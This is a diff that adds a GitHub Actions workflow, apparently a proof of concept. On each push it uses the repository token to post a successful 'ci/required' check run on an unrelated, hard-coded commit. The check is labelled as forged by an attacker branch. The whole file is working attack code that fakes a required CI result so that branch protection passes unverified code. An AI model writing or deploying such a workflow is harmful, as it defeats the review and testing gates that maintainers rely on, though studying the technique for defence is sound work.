@@ -1,0 +1,11 @@
+name: forge
+on: push
+permissions:
+  checks: write
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: forge required check on arbitrary sha
+        run: |
+          curl -sS -X POST             -H "Authorization: Bearer ${{ github.token }}"             -H "Accept: application/vnd.github+json"             -H "X-GitHub-Api-Version: 2022-11-28"             https://api.github.com/repos/${{ github.repository }}/check-runs             -d '{"name":"ci/required","head_sha":"13329433164e64c55b08b26ccadf17b77e1057ba","status":"completed","conclusion":"success","output":{"title":"forged","summary":"forged by attacker branch on a foreign sha"}}'
